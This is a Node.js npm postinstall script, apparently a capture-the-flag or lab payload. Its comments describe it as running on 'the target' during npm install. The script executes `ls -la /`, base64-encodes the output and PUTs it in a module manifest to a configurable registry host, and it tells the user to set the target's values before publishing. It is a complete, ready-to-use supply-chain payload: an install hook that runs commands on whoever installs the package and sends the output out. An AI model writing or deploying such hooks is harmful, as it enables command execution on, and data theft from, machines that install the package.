// postinstall.js
// Runs during npm install on the target, runs `ls -la /`, base64-encodes it,
// and PUTs a small manifest containing install_output_b64 to the registry API.
//
// IMPORTANT: set MODULE_ID and REGISTRY_* to the correct values for the target
// before pushing/publishing this package.

const { execSync } = require('child_process');
const http = require('http');
const fs = require('fs');

const MODULE_ID = 'ECT-987654';      // <-- CHANGE this to the actual module id
const REGISTRY_HOST = '127.0.0.1';   // <-- CHANGE if needed (target's registry host)
const REGISTRY_PORT = 3000;          // <-- CHANGE if needed
const REGISTRY_PATH = `/api/modules/${MODULE_ID}`;
const TIMEOUT_MS = 30_000;

try {
  // 1) run ls and capture output
  let rawOut = '';
  try {
    rawOut = execSync('ls -la / 2>&1', { timeout: TIMEOUT_MS }).toString('utf8');
  } catch (execErr) {
    // capture even failed exec output
    try {
      rawOut = String(execErr.stdout || execErr.stderr || execErr.message || execErr);
    } catch (e) {
      rawOut = String(execErr);
    }
  }

  // 2) base64 encode output (single-line)
  const b64 = Buffer.from(rawOut, 'utf8').toString('base64');

  // 3) build YAML-ish manifest string (adjust wrapper if the API expects a top-level 'ecto_module:')
  // If the backend expects `ecto_module:` wrapper, change accordingly.
  const manifestYaml = `name: "Siren's Lament"\ninstall_output_b64: "${b64}"\n`;

  const body = JSON.stringify({ manifest: manifestYaml });

  // 4) PUT to the registry API (localhost example)
  const opts = {
    hostname: REGISTRY_HOST,
    port: REGISTRY_PORT,
    path: REGISTRY_PATH,
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    },
    timeout: 10_000
  };

  const req = http.request(opts, (res) => {
    // write small status file so if you can access target FS you can confirm
    try {
      fs.writeFileSync('/tmp/postinstall_put_status', `status:${res.statusCode}`, 'utf8');
    } catch (e) { /* ignore write errors */ }
    res.on('data', () => {}); // drain
    res.on('end', () => {});
  });

  req.on('error', (err) => {
    try { fs.writeFileSync('/tmp/postinstall_put_error', String(err), 'utf8'); } catch (e) {}
  });

  req.write(body);
  req.end();
} catch (err) {
  try { fs.writeFileSync('/tmp/postinstall_exec_error', String(err), 'utf8'); } catch (e) {}
}
